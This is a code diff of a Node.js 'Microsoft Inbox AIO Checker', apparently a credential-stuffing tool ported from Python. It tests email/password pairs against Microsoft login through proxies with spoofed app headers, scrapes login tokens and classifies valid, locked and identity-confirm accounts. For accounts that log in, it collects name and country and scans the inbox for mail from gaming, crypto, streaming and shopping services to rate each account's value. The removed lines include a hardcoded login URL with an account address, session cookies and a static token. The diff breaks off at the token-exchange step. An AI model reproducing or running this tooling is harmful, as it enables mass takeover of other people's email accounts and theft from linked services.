@@ -1,289 +1,199 @@
 // ============================================================
-//  Microsoft Inbox AIO Checker — Node.js port of hotmail_checker.py
-//  Logs into Hotmail/Outlook, searches inbox for 50+ services
+//  Microsoft Inbox AIO Checker — Node.js port of new_2.py (OutlookChecker)
+//  IDP check → OAuth authorize → Login → Token → Profile → Inbox scan
+//  Services matched by sender email address in bulk message data
 // ============================================================
 
 const { proxiedFetch } = require("./proxy-manager");
+const { randomUUID } = require("crypto");
 
-// ── Service definitions ─────────────────────────────────────
-// Each service: { keyword, label, category }
-const SERVICES = [
-  // ── Streaming ──
-  { keyword: "netflix", label: "Netflix", category: "Streaming" },
-  { keyword: "disney+", label: "Disney+", category: "Streaming" },
-  { keyword: "hulu", label: "Hulu", category: "Streaming" },
-  { keyword: "hbo max", label: "HBO Max", category: "Streaming" },
-  { keyword: "amazon prime", label: "Amazon Prime", category: "Streaming" },
-  { keyword: "paramount+", label: "Paramount+", category: "Streaming" },
-  { keyword: "peacock", label: "Peacock", category: "Streaming" },
-  { keyword: "apple tv", label: "Apple TV+", category: "Streaming" },
-  { keyword: "crunchyroll", label: "Crunchyroll", category: "Streaming" },
-  { keyword: "funimation", label: "Funimation", category: "Streaming" },
-  { keyword: "youtube premium", label: "YouTube Premium", category: "Streaming" },
-  { keyword: "dazn", label: "DAZN", category: "Streaming" },
-  { keyword: "curiositystream", label: "CuriosityStream", category: "Streaming" },
-  { keyword: "mubi", label: "MUBI", category: "Streaming" },
-  { keyword: "shudder", label: "Shudder", category: "Streaming" },
-  { keyword: "britbox", label: "BritBox", category: "Streaming" },
-  { keyword: "starz", label: "Starz", category: "Streaming" },
-  { keyword: "showtime", label: "Showtime", category: "Streaming" },
-  { keyword: "pluto tv", label: "Pluto TV", category: "Streaming" },
-  { keyword: "tubi", label: "Tubi", category: "Streaming" },
-  { keyword: "vudu", label: "Vudu", category: "Streaming" },
-  { keyword: "plex", label: "Plex", category: "Streaming" },
+// ── Service definitions (exact match of Python default_services) ──
+const SERVICES = {
+  "noreply@microsoft.com": "Microsoft",
+  "no_reply@email.apple.com": "Apple",
+  "noreply@email.apple.com": "Apple2",
+  "no-reply@icloud.com": "iCloud",
+  "Azure-noreply@microsoft.com": "Azure",
+  "noreply@mail.accounts.riotgames.com": "Riot",
+  "konami-info@konami.net": "Konami",
+  "noreply@id.supercell.com": "Supercell",
+  "newsletter@service.tiktok.com": "TikTok",
+  "no-reply@mail.instagram.com": "Instagram",
+  "mail.instagram.com": "Instagram",
+  "notifications-noreply@linkedin.com": "LinkedIn",
+  "fortnite@epicgames.com": "Fortnite",
+  "reply@txn-email.playstation.com": "PlayStation",
+  "no-reply@coinbase.com": "Coinbase",
+  "noreply@steampowered.com": "Steam",
+  "info@account.netflix.com": "Netflix",
+  "noreply@pubgmobile.com": "PUBG",
+  "security@facebookmail.com": "Facebook",
+  "callofduty@comms.activision.com": "COD",
+  "notification@facebookmail.com": "Facebook",
+  "no-reply@spotify.com": "Spotify",
+  "no_reply@snapchat.com": "Snapchat",
+  "hello@mail.crunchyroll.com": "Crunchyroll",
+  "no-reply@accounts.google.com": "Google",
+  "account-update@amazon.com": "Amazon",
+  "no-reply@epicgames.com": "Epic",
+  "notifications@twitter.com": "Twitter",
+  "noreply@twitch.tv": "Twitch",
+  "email@discord.com": "Discord",
+  "info@trendyolmail.com": "Trendyol",
+  "noreply@zara.com": "Zara",
+  "no-reply@itemsatis.com": "itemsatis",
+  "noreply@hesap.com.tr": "hesapcomtr",
+  "noreply@roblox.com": "Roblox",
+  "noreply@ea.com": "EA",
+  "account@nintendo.com": "Nintendo",
+};
 
-  // ── Music ──
-  { keyword: "spotify", label: "Spotify", category: "Music" },
-  { keyword: "apple music", label: "Apple Music", category: "Music" },
-  { keyword: "tidal", label: "Tidal", category: "Music" },
-  { keyword: "deezer", label: "Deezer", category: "Music" },
-  { keyword: "soundcloud", label: "SoundCloud", category: "Music" },
-  { keyword: "pandora", label: "Pandora", category: "Music" },
-  { keyword: "audiomack", label: "Audiomack", category: "Music" },
-  { keyword: "amazon music", label: "Amazon Music", category: "Music" },
-  { keyword: "bandcamp", label: "Bandcamp", category: "Music" },
-
-  // ── Gaming ──
-  { keyword: "roblox", label: "Roblox", category: "Gaming" },
-  { keyword: "steam", label: "Steam", category: "Gaming" },
-  { keyword: "epic games", label: "Epic Games", category: "Gaming" },
-  { keyword: "riot games", label: "Riot Games", category: "Gaming" },
-  { keyword: "playstation", label: "PlayStation", category: "Gaming" },
-  { keyword: "xbox", label: "Xbox", category: "Gaming" },
-  { keyword: "ea.com", label: "EA", category: "Gaming" },
-  { keyword: "ubisoft", label: "Ubisoft", category: "Gaming" },
-  { keyword: "activision", label: "Activision", category: "Gaming" },
-  { keyword: "minecraft", label: "Minecraft", category: "Gaming" },
-  { keyword: "blizzard", label: "Blizzard", category: "Gaming" },
-  { keyword: "rockstar games", label: "Rockstar Games", category: "Gaming" },
-  { keyword: "bethesda", label: "Bethesda", category: "Gaming" },
-  { keyword: "nintendo", label: "Nintendo", category: "Gaming" },
-  { keyword: "gog.com", label: "GOG", category: "Gaming" },
-  { keyword: "humble bundle", label: "Humble Bundle", category: "Gaming" },
-  { keyword: "twitch", label: "Twitch", category: "Gaming" },
-  { keyword: "origin", label: "Origin/EA", category: "Gaming" },
-  { keyword: "valorant", label: "Valorant", category: "Gaming" },
-  { keyword: "fortnite", label: "Fortnite", category: "Gaming" },
-  { keyword: "apex legends", label: "Apex Legends", category: "Gaming" },
-  { keyword: "genshin", label: "Genshin Impact", category: "Gaming" },
-  { keyword: "mihoyo", label: "miHoYo/HoYoverse", category: "Gaming" },
-
-  // ── Shopping / Finance ──
-  { keyword: "paypal", label: "PayPal", category: "Shopping" },
-  { keyword: "amazon.com", label: "Amazon", category: "Shopping" },
-  { keyword: "ebay", label: "eBay", category: "Shopping" },
-  { keyword: "walmart", label: "Walmart", category: "Shopping" },
-  { keyword: "shopify", label: "Shopify", category: "Shopping" },
-  { keyword: "aliexpress", label: "AliExpress", category: "Shopping" },
-  { keyword: "stripe", label: "Stripe", category: "Shopping" },
-  { keyword: "cash app", label: "Cash App", category: "Shopping" },
-  { keyword: "venmo", label: "Venmo", category: "Shopping" },
-  { keyword: "zelle", label: "Zelle", category: "Shopping" },
-  { keyword: "etsy", label: "Etsy", category: "Shopping" },
-  { keyword: "wish", label: "Wish", category: "Shopping" },
-  { keyword: "best buy", label: "Best Buy", category: "Shopping" },
-  { keyword: "target", label: "Target", category: "Shopping" },
-  { keyword: "nike", label: "Nike", category: "Shopping" },
-  { keyword: "adidas", label: "Adidas", category: "Shopping" },
-  { keyword: "shein", label: "SHEIN", category: "Shopping" },
-  { keyword: "stockx", label: "StockX", category: "Shopping" },
-  { keyword: "grubhub", label: "Grubhub", category: "Shopping" },
-  { keyword: "doordash", label: "DoorDash", category: "Shopping" },
-  { keyword: "uber eats", label: "Uber Eats", category: "Shopping" },
-  { keyword: "instacart", label: "Instacart", category: "Shopping" },
-
-  // ── Social ──
-  { keyword: "facebook", label: "Facebook", category: "Social" },
-  { keyword: "instagram", label: "Instagram", category: "Social" },
-  { keyword: "twitter", label: "Twitter/X", category: "Social" },
-  { keyword: "tiktok", label: "TikTok", category: "Social" },
-  { keyword: "snapchat", label: "Snapchat", category: "Social" },
-  { keyword: "discord", label: "Discord", category: "Social" },
-  { keyword: "telegram", label: "Telegram", category: "Social" },
-  { keyword: "reddit", label: "Reddit", category: "Social" },
-  { keyword: "linkedin", label: "LinkedIn", category: "Social" },
-  { keyword: "pinterest", label: "Pinterest", category: "Social" },
-  { keyword: "tumblr", label: "Tumblr", category: "Social" },
-  { keyword: "whatsapp", label: "WhatsApp", category: "Social" },
-  { keyword: "signal", label: "Signal", category: "Social" },
-  { keyword: "wechat", label: "WeChat", category: "Social" },
-  { keyword: "line", label: "LINE", category: "Social" },
-  { keyword: "viber", label: "Viber", category: "Social" },
-  { keyword: "clubhouse", label: "Clubhouse", category: "Social" },
-  { keyword: "mastodon", label: "Mastodon", category: "Social" },
-  { keyword: "threads", label: "Threads", category: "Social" },
-  { keyword: "bluesky", label: "Bluesky", category: "Social" },
-
-  // ── Cloud / Productivity ──
-  { keyword: "dropbox", label: "Dropbox", category: "Cloud" },
-  { keyword: "google drive", label: "Google Drive", category: "Cloud" },
-  { keyword: "icloud", label: "iCloud", category: "Cloud" },
-  { keyword: "notion", label: "Notion", category: "Cloud" },
-  { keyword: "zoom", label: "Zoom", category: "Cloud" },
-  { keyword: "canva", label: "Canva", category: "Cloud" },
-  { keyword: "adobe", label: "Adobe", category: "Cloud" },
-  { keyword: "github", label: "GitHub", category: "Cloud" },
-  { keyword: "gitlab", label: "GitLab", category: "Cloud" },
-  { keyword: "slack", label: "Slack", category: "Cloud" },
-  { keyword: "trello", label: "Trello", category: "Cloud" },
-  { keyword: "asana", label: "Asana", category: "Cloud" },
-  { keyword: "figma", label: "Figma", category: "Cloud" },
-  { keyword: "grammarly", label: "Grammarly", category: "Cloud" },
-  { keyword: "evernote", label: "Evernote", category: "Cloud" },
-  { keyword: "microsoft 365", label: "Microsoft 365", category: "Cloud" },
-  { keyword: "google workspace", label: "Google Workspace", category: "Cloud" },
-  { keyword: "heroku", label: "Heroku", category: "Cloud" },
-  { keyword: "vercel", label: "Vercel", category: "Cloud" },
-  { keyword: "cloudflare", label: "Cloudflare", category: "Cloud" },
-  { keyword: "digitalocean", label: "DigitalOcean", category: "Cloud" },
-  { keyword: "aws", label: "AWS", category: "Cloud" },
-  { keyword: "chatgpt", label: "ChatGPT", category: "Cloud" },
-  { keyword: "openai", label: "OpenAI", category: "Cloud" },
-  { keyword: "midjourney", label: "Midjourney", category: "Cloud" },
-
-  // ── Crypto ──
-  { keyword: "coinbase", label: "Coinbase", category: "Crypto" },
-  { keyword: "binance", label: "Binance", category: "Crypto" },
-  { keyword: "crypto.com", label: "Crypto.com", category: "Crypto" },
-  { keyword: "kraken", label: "Kraken", category: "Crypto" },
-  { keyword: "gemini", label: "Gemini", category: "Crypto" },
-  { keyword: "robinhood", label: "Robinhood", category: "Crypto" },
-  { keyword: "metamask", label: "MetaMask", category: "Crypto" },
-  { keyword: "trust wallet", label: "Trust Wallet", category: "Crypto" },
-  { keyword: "phantom wallet", label: "Phantom", category: "Crypto" },
-  { keyword: "opensea", label: "OpenSea", category: "Crypto" },
-  { keyword: "bybit", label: "Bybit", category: "Crypto" },
-  { keyword: "kucoin", label: "KuCoin", category: "Crypto" },
-  { keyword: "uniswap", label: "Uniswap", category: "Crypto" },
-  { keyword: "ledger", label: "Ledger", category: "Crypto" },
-
-  // ── Travel / Transport ──
-  { keyword: "uber", label: "Uber", category: "Travel" },
-  { keyword: "lyft", label: "Lyft", category: "Travel" },
-  { keyword: "airbnb", label: "Airbnb", category: "Travel" },
-  { keyword: "booking.com", label: "Booking.com", category: "Travel" },
-  { keyword: "expedia", label: "Expedia", category: "Travel" },
-  { keyword: "tripadvisor", label: "TripAdvisor", category: "Travel" },
-  { keyword: "southwest airlines", label: "Southwest", category: "Travel" },
-  { keyword: "united airlines", label: "United Airlines", category: "Travel" },
-  { keyword: "delta airlines", label: "Delta Airlines", category: "Travel" },
-
-  // ── Education ──
-  { keyword: "coursera", label: "Coursera", category: "Education" },
-  { keyword: "udemy", label: "Udemy", category: "Education" },
-  { keyword: "skillshare", label: "Skillshare", category: "Education" },
-  { keyword: "duolingo", label: "Duolingo", category: "Education" },
-  { keyword: "khan academy", label: "Khan Academy", category: "Education" },
-  { keyword: "codecademy", label: "Codecademy", category: "Education" },
-  { keyword: "linkedin learning", label: "LinkedIn Learning", category: "Education" },
-  { keyword: "masterclass", label: "MasterClass", category: "Education" },
-
-  // ── VPN / Security ──
-  { keyword: "nordvpn", label: "NordVPN", category: "VPN" },
-  { keyword: "expressvpn", label: "ExpressVPN", category: "VPN" },
-  { keyword: "surfshark", label: "Surfshark", category: "VPN" },
-  { keyword: "protonvpn", label: "ProtonVPN", category: "VPN" },
-  { keyword: "protonmail", label: "ProtonMail", category: "VPN" },
-  { keyword: "1password", label: "1Password", category: "VPN" },
-  { keyword: "lastpass", label: "LastPass", category: "VPN" },
-  { keyword: "bitwarden", label: "Bitwarden", category: "VPN" },
-  { keyword: "dashlane", label: "Dashlane", category: "VPN" },
-  { keyword: "malwarebytes", label: "Malwarebytes", category: "VPN" },
-  { keyword: "norton", label: "Norton", category: "VPN" },
-  { keyword: "mcafee", label: "McAfee", category: "VPN" },
-
-  // ── Dating ──
-  { keyword: "tinder", label: "Tinder", category: "Dating" },
-  { keyword: "bumble", label: "Bumble", category: "Dating" },
-  { keyword: "hinge", label: "Hinge", category: "Dating" },
-  { keyword: "match.com", label: "Match.com", category: "Dating" },
-  { keyword: "okcupid", label: "OkCupid", category: "Dating" },
-
-  // ── Health / Fitness ──
-  { keyword: "myfitnesspal", label: "MyFitnessPal", category: "Health" },
-  { keyword: "fitbit", label: "Fitbit", category: "Health" },
-  { keyword: "peloton", label: "Peloton", category: "Health" },
-  { keyword: "headspace", label: "Headspace", category: "Health" },
-  { keyword: "calm", label: "Calm", category: "Health" },
-  { keyword: "strava", label: "Strava", category: "Health" },
-];
-
-const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
 const MAX_RETRIES = 3;
 const RETRY_DELAY = 2000;
 
-// Static login — exact match of working Python chkbox.py
-const LOGIN_URL = "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username=ashleypetty%40outlook.com&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216";
-
-const LOGIN_HEADERS = {
-  "Host": "login.live.com",
-  "Connection": "keep-alive",
-  "Cache-Control": "max-age=0",
-  "sec-ch-ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
-  "sec-ch-ua-mobile": "?0",
-  "sec-ch-ua-platform": '"Windows"',
-  "Upgrade-Insecure-Requests": "1",
-  "Origin": "https://login.live.com",
-  "Content-Type": "application/x-www-form-urlencoded",
-  "User-Agent": USER_AGENT,
-  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-  "Sec-Fetch-Site": "same-origin",
-  "Sec-Fetch-Mode": "navigate",
-  "Sec-Fetch-User": "?1",
-  "Sec-Fetch-Dest": "document",
-  "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username=ashleypetty%40outlook.com",
-  "Accept-Language": "en-US,en;q=0.9",
-  "Cookie": "MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89",
-  "Accept-Encoding": "gzip, deflate",
-};
-
-// Hardcoded PPFT — URL-encoded, matching working Python exactly
-const STATIC_PPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24";
-
 // ── Helpers ──────────────────────────────────────────────────
-
-function parseLR(text, left, right) {
-  try {
-    const start = text.indexOf(left);
-    if (start === -1) return "";
-    const begin = start + left.length;
-    const end = text.indexOf(right, begin);
-    if (end === -1) return "";
-    return text.substring(begin, end);
-  } catch { return ""; }
-}
-
-function findNestedValues(obj, key) {
-  const out = [];
-  if (obj && typeof obj === "object") {
-    if (Array.isArray(obj)) {
-      for (const item of obj) out.push(...findNestedValues(item, key));
-    } else {
-      for (const [k, v] of Object.entries(obj)) {
-        if (k.toLowerCase() === key.toLowerCase()) out.push(v);
-        out.push(...findNestedValues(v, key));
-      }
-    }
-  }
-  return out;
-}
-
-function extractTotalMessages(searchJson, rawText) {
-  const totals = [];
-  for (const val of findNestedValues(searchJson, "Total")) {
-    const n = parseInt(String(val).trim(), 10);
-    if (!isNaN(n)) totals.push(n);
-  }
-  if (totals.length > 0) return Math.max(...totals);
-  const t = parseLR(rawText, '"Total":', ",");
-  if (t) { const n = parseInt(t.trim(), 10); if (!isNaN(n)) return n; }
-  return 0;
-}
 
 function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-// ── Manual redirect fetch (captures cookies at each hop) ────
-async function sessionFetch(url, options, cookieJar, maxRedirects = 8) {
+function parseCountryFromJson(data) {
+  try {
+    if (!data || typeof data !== "object") return "";
+    if (Array.isArray(data.accounts)) {
+      for (const acc of data.accounts) {
+        if (acc && acc.location) return String(acc.location).trim();
+      }
+    }
+    if (data.location) {
+      if (typeof data.location === "string") {
+        const parts = data.location.split(",").map(p => p.trim());
+        return parts[parts.length - 1] || "";
+      }
+      if (typeof data.location === "object") {
+        for (const key of ["country", "countryOrRegion", "countryCode", "Country"]) {
+          if (data.location[key]) return String(data.location[key]);
+        }
+      }
+    }
+    for (const key of ["country", "countryOrRegion", "countryCode", "Country", "homeLocation"]) {
+      if (data[key]) {
+        if (typeof data[key] === "string") return data[key];
+        if (typeof data[key] === "object" && data[key].country) return String(data[key].country);
+      }
+    }
+  } catch {}
+  return "";
+}
+
+function parseNameFromJson(data) {
+  try {
+    if (!data || typeof data !== "object") return "";
+    if (data.displayName) return String(data.displayName);
+    for (const key of ["name", "givenName", "fullName", "DisplayName"]) {
+      if (data[key]) return String(data[key]);
+    }
+  } catch {}
+  return "";
+}
+
+function extractSubjectsFromJson(jsonText) {
+  const subjects = [];
+  try {
+    const data = JSON.parse(jsonText);
+    if (data && data.value && Array.isArray(data.value)) {
+      for (const msg of data.value) {
+        if (msg && msg.subject && typeof msg.subject === "string") {
+          subjects.push(msg.subject.trim());
+        }
+      }
+    }
+    // Recursive search for Subject/subject
+    function findSubjects(obj) {
+      if (!obj || typeof obj !== "object") return;
+      if (Array.isArray(obj)) {
+        for (const item of obj) findSubjects(item);
+      } else {
+        if (obj.Subject) subjects.push(String(obj.Subject).trim());
+        else if (obj.subject && typeof obj.subject === "string") subjects.push(obj.subject.trim());
+        for (const v of Object.values(obj)) findSubjects(v);
+      }
+    }
+    if (!data?.value) findSubjects(data);
+  } catch {}
+  return subjects;
+}
+
+function countServiceMessagesWithSubjects(allMessagesText, allMessagesJsonList, services) {
+  const foundServices = {};
+  const allLower = allMessagesText.toLowerCase();
+
+  // Group email patterns by service name
+  const servicePatterns = {};
+  for (const [email, name] of Object.entries(services)) {
+    if (!servicePatterns[name]) servicePatterns[name] = [];
+    servicePatterns[name].push(email.toLowerCase());
+  }
+
+  for (const [serviceName, emailPatterns] of Object.entries(servicePatterns)) {
+    let maxCount = 0;
+    const serviceSubjects = [];
+
+    for (const emailPattern of emailPatterns) {
+      const count = (allLower.split(emailPattern).length - 1);
+      const domain = emailPattern.includes("@") ? emailPattern.split("@")[1] : emailPattern;
+      const domainCount = (allLower.split(domain).length - 1);
+
+      if (domainCount > maxCount) maxCount = domainCount;
+      if (count > maxCount) maxCount = count;
+
+      // Collect subjects
+      for (const jsonText of allMessagesJsonList) {
+        if (jsonText.toLowerCase().includes(emailPattern) || jsonText.toLowerCase().includes(domain)) {
+          serviceSubjects.push(...extractSubjectsFromJson(jsonText));
+        }
+      }
+    }
+
+    if (maxCount > 0) {
+      // Dedupe subjects
+      const seen = new Set();
+      const unique = [];
+      for (const s of serviceSubjects) {
+        if (s && !seen.has(s)) { seen.add(s); unique.push(s); }
+      }
+      foundServices[serviceName] = {
+        count: maxCount,
+        subjects: unique.slice(0, 10),
+      };
+    }
+  }
+
+  return foundServices;
+}
+
+// ── Cookie jar ──────────────────────────────────────────────
+
+function createCookieJar() {
+  const jar = new Map();
+  return {
+    set(name, value) { jar.set(name, value); },
+    get(name) { return jar.get(name); },
+    toString() { return [...jar.entries()].map(([k, v]) => `${k}=${v}`).join("; "); },
+    getDict() { return Object.fromEntries(jar); },
+    parseFromHeaders(headers) {
+      const setCookie = headers.getSetCookie?.() || [];
+      for (const c of setCookie) {
+        const parts = c.split(";")[0].split("=");
+        if (parts.length >= 2) {
+          jar.set(parts[0].trim(), parts.slice(1).join("=").trim());
+        }
+      }
+    },
+  };
+}
+
+// ── Session fetch with manual redirects + cookie persistence ──
+
+async function sessionFetch(url, options, cookieJar, maxRedirects = 10) {
   let currentUrl = url;
   for (let i = 0; i < maxRedirects; i++) {
     const resp = await proxiedFetch(currentUrl, {
@@ -294,8 +204,6 @@ async function sessionFetch(url, options, cookieJar, maxRedirects = 8) {
         Cookie: cookieJar.toString(),
       },
     });
-
-    // Capture cookies from this hop
     cookieJar.parseFromHeaders(resp.headers);
 
     const status = resp.status;
@@ -303,21 +211,14 @@ async function sessionFetch(url, options, cookieJar, maxRedirects = 8) {
       const location = resp.headers.get("location");
       if (!location) break;
       currentUrl = location.startsWith("http") ? location : new URL(location, currentUrl).href;
-      // Switch to GET on redirect
       options = { ...options, method: "GET", body: undefined };
       continue;
     }
-
-    // Not a redirect — return with final URL attached
     resp._finalUrl = currentUrl;
     return resp;
   }
-  // Exhausted redirects, do one final fetch
   const finalResp = await proxiedFetch(currentUrl, {
-    ...options,
-    method: "GET",
-    body: undefined,
-    redirect: "manual",
+    ...options, method: "GET", body: undefined, redirect: "manual",
     headers: { ...(options.headers || {}), Cookie: cookieJar.toString() },
   });
   cookieJar.parseFromHeaders(finalResp.headers);
@@ -325,33 +226,7 @@ async function sessionFetch(url, options, cookieJar, maxRedirects = 8) {
   return finalResp;
 }
 
-// ── Cookie jar (simple Map-based) ───────────────────────────
-
-function createCookieJar() {
-  const jar = new Map();
-  return {
-    set(name, value) { jar.set(name, value); },
-    get(name) { return jar.get(name); },
-    toString() {
-      return [...jar.entries()].map(([k, v]) => `${k}=${v}`).join("; ");
-    },
-    parseFromHeaders(headers) {
-      const setCookie = headers.getSetCookie?.() || [];
-      for (const c of setCookie) {
-        const parts = c.split(";")[0].split("=");
-        if (parts.length >= 2) {
-          jar.set(parts[0].trim(), parts.slice(1).join("=").trim());
-        }
-      }
-    },
-    has(search) {
-      const str = this.toString();
-      return str.includes(search);
-    },
-  };
-}
-
-// ── Single account check ────────────────────────────────────
+// ── Single account check (1:1 port of OutlookChecker.check) ──
 
 async function attemptCheck(email, password) {
   const result = {
@@ -361,282 +236,288 @@ async function attemptCheck(email, password) {
     captures: {},
     services: {},
     detail: "",
+    country: "",
+    name: "",
+    birthdate: "",
   };
 
   const cookieJar = createCookieJar();
+  const uid = randomUUID();
 
   try {
-    // ── Step 1: Direct POST login (exact match of working Python chkbox.py) ──
-    const postBody = 
-      "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=" +
-      `&PPFT=${STATIC_PPFT}` +
-      "&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0" +
-      "&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1" +
-      `&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(email)}` +
-      `&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=` +
-      `&passwd=${encodeURIComponent(password)}`;
+    // ── Step 1: IDP check ──
+    const idpUrl = `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${encodeURIComponent(email)}`;
+    const idpResp = await proxiedFetch(idpUrl, {
+      headers: {
+        "X-OneAuth-AppName": "Outlook Lite",
+        "X-Office-Version": "3.11.0-minApi24",
+        "X-CorrelationId": uid,
+        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
+        "Host": "odc.officeapps.live.com",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+      },
+      signal: AbortSignal.timeout(15000),
+    });
+    const idpText = await idpResp.text();
 
-    const resp = await sessionFetch(LOGIN_URL, {
-      method: "POST",
-      headers: { ...LOGIN_HEADERS },
-      body: postBody,
-      signal: AbortSignal.timeout(20000),
+    if (["Neither", "Both", "Placeholder", "OrgId"].some(x => idpText.includes(x))) {
+      result.detail = "IDP check failed";
+      return result;
+    }
+    if (!idpText.includes("MSAccount")) {
+      result.detail = "not MSAccount";
+      return result;
+    }
+
+    // ── Step 2: OAuth authorize (get PPFT + urlPost dynamically) ──
+    await delay(500);
+
+    const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=${encodeURIComponent(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D`;
+
+    const authResp = await sessionFetch(authUrl, {
+      method: "GET",
+      headers: {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "keep-alive",
+      },
+      signal: AbortSignal.timeout(15000),
     }, cookieJar);
 
-    const body = await resp.text();
-    const finalUrl = resp._finalUrl || resp.url;
+    const authBody = await authResp.text();
 
-    // Status detection
-    if ([
-      "Your account or password is incorrect",
-      "That Microsoft account doesn\\'t exist",
-      "That Microsoft account doesn't exist",
-      "Sign in to your Microsoft account",
-      "timed out",
-    ].some(x => body.includes(x))) {
-      result.status = "fail";
+    const urlMatch = authBody.match(/urlPost":"([^"]+)"/);
+    const ppftMatch = authBody.match(/name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"/);
+
+    if (!urlMatch || !ppftMatch) {
+      // Try alternate patterns
+      const urlMatch2 = authBody.match(/urlPost:'([^']+)'/);
+      const ppftMatch2 = authBody.match(/name="PPFT"[^>]*value="([^"]+)"/);
+      if (!urlMatch2 && !urlMatch || !ppftMatch2 && !ppftMatch) {
+        result.detail = "PPFT/urlPost not found";
+        return result;
+      }
+    }
+
+    const postUrl = (urlMatch ? urlMatch[1] : authBody.match(/urlPost:'([^']+)'/)?.[1] || "").replace(/\\\//g, "/");
+    const ppft = ppftMatch ? ppftMatch[1] : (authBody.match(/name="PPFT"[^>]*value="([^"]+)"/)?.[1] || "");
+
+    if (!postUrl || !ppft) {
+      result.detail = "PPFT/urlPost extraction failed";
+      return result;
+    }
+
+    // ── Step 3: Login POST (allow_redirects=False equivalent) ──
+    const loginData = `i13=1&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${encodeURIComponent(ppft)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960`;
+
+    const loginResp = await proxiedFetch(postUrl, {
+      method: "POST",
+      body: loginData,
+      redirect: "manual",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Origin": "https://login.live.com",
+        "Referer": authResp._finalUrl || authUrl,
+        Cookie: cookieJar.toString(),
+      },
+      signal: AbortSignal.timeout(15000),
+    });
+
+    cookieJar.parseFromHeaders(loginResp.headers);
+    const loginBody = await loginResp.text();
+
+    if (loginBody.includes("account or password is incorrect") || (loginBody.match(/error/g) || []).length > 0) {
       result.detail = "bad credentials";
       return result;
     }
-
-    if (body.includes(",AC:null,urlFedConvertRename")) {
-      result.status = "retry";
-      result.detail = "ban/rate limit";
+    if (loginBody.includes("https://account.live.com/identity/confirm")) {
+      result.detail = "identity confirm";
+      return result;
+    }
+    if (loginBody.includes("https://account.live.com/Abuse")) {
+      result.detail = "abuse/locked";
       return result;
     }
 
-    if (["account.live.com/recover?mkt", "recover?mkt",
-         "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt"
-    ].some(x => body.includes(x))) {
-      result.status = "2fa";
-      result.detail = "2FA/recovery";
+    const location = loginResp.headers.get("location") || "";
+    if (!location) {
+      result.detail = "no redirect location";
       return result;
     }
 
-    if (body.includes("/cancel?mkt=") || body.includes("/Abuse?mkt=")) {
-      result.status = "locked";
-      result.detail = "locked/abuse";
+    const codeMatch = location.match(/code=([^&]+)/);
+    if (!codeMatch) {
+      result.detail = "auth code not found";
+      return result;
+    }
+    const authCode = codeMatch[1];
+
+    // Get CID from cookies
+    const mspcid = cookieJar.get("MSPCID") || "";
+    if (!mspcid) {
+      result.detail = "CID not found";
+      return result;
+    }
+    const cid = mspcid.toUpperCase();
+
+    // ── Step 4: Exchange code for token ──
